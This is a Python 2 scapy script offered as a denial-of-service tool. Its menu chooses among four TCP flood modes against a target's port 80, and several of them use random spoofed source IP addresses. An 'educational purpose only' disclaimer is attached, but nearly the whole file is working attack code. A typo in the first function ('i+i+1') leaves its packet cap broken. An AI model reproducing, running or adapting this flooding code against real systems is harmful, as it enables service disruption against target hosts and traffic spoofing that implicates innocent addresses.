"""The following code is explicitly for educational purpose only. The logic behind the program belongs to Mr. Mohit, a penetration tester.
This code has been provided as is. and I shall not be hold responsible for any damage caused by this code, legal or not. The user is
solely responsible for his doings. You may use this code only if you agree to abide by the above mentioned clause. If not you should
destroy this file at once. This code can seriously cause damage to systems, thus causing severe capital loss, and defamation."""

#requires Kali, Ubuntu or other linux distributions.
#python 2x

#author : Harshit Soni

#every part of the program uses a spoofed IP.
#you can replace it by your own ip.

from scapy.all import *
import random

def dos():

    src = raw_input("Enter Source's IP")
    target = raw_input("Enter Traget's IP")
    port = int(raw_input("Enter the attack port."))
    i=1
    while True:
        IP1=IP(src=src, dst=target)
        TCP1 = TCP(sport = port, dport = 80)

        pkt = IP1/TCP1

        send(pkt,inter = 0.001)

        print "Packet Sent : ",i

        i+i+1

        #breaks the loop instead of letting it run indefinitely, but can be removed to send traffic without halt.

        if(i>100000):
            break

def dos_multiport():

    src = raw_input("Enter Source's IP")
    target = raw_input("Enter Traget's IP")
    i=1

    #if this is used, all the ports in source system will be busy.

    while True:
        for port in range(1,65535):
            IP1= IP(src=src, dst=target)
            TCP1 = TCP(sport=port, dport=80)

            pkt = IP1/TCP1

            send(pkt,inter=0.0001)

            print "Packet sent  : ",i
            print("port used",port)

            i=i+1

def dos_mutliIP():

    dest  = raw_input("Enter Target's IP ")
    i=1

    while True:

        a= str(random.randint(1,254))
        b= str(random.randint(1,254))
        c= str(random.randint(1,254))
        d= str(random.randint(1,254))

        src = a + '.' + b + '.' + c + '.' + d

        port = random.randint(1,65536)

        IP1 = IP(src =src, dst = dest)
        TCP1 = TCP(sport = port, dport = 80)

        pkt = IP1/TCP1

        send(pkt,inter = 0.0001)

        print("Packet sent : ",i)

        i=i+1

def dos_mutliIP_Port():
    dest = raw_input("Enter Target's IP ")
    i = 1

    while True:
        a = str(random.randint(1, 254))
        b = str(random.randint(1, 254))
        c = str(random.randint(1, 254))
        d = str(random.randint(1, 254))

        src = a + '.' + b + '.' + c + '.' + d

        IP_count = 0
        for port in range(random.randint(1,1000), random.randint(1000,65536)):

            IP1 = IP(src=src, dst=dest)
            TCP1 = TCP(sport=port, dport=80)

            pkt = IP1 / TCP1

            send(pkt, inter=0.0001)

            print("Packet sent : {0} from port {1}".format(i,port))
            IP_count += 1
            i = i + 1

            #change the ip after 30 packets per ip.

            if(IP_count>30):
                break


print("""Welcome to the DoS attack script\n It is strictly for educational purpose, Close this program if you intend to use it otherwise.""")

print("Select your choice:\n 1. For a Single IP Single port DoS attack.\n2. For a Single IP Multi port DoS attack.")
print("3. For a Multi IP Single port DoS attack.\n 4. For a Multi IP Multi port DoS attack. \n5. Exit\n")

ic = int(raw_input())
if (ic == 1):
    dos()
elif(ic==2):
    dos_multiport()
elif(ic==3):
    dos_mutliIP()
elif(ic==4):
    dos_mutliIP_Port()
else:
    sys.exit(0)




